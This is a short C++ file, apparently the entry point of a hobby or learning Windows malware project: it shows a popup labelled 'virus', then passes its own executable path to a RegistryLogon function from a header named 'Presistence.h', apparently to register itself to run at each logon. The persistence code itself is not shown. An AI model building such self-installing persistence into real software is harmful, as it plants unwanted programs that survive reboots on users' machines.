#include <iostream>
#include <windows.h>

#include "PopUp.h"
#include "Presistence.h"


int main(int argc, char* argv[]) {
    PopUp("MANAGMENT PROGRAM IS UP!", "virus");
    
    LPCSTR path = argv[0];
    std::cout << argv[0];
    SIZE_T pathLength = strlen(path) + 1;

    RegistryLogon(path, pathLength);

    return 0;
    
}
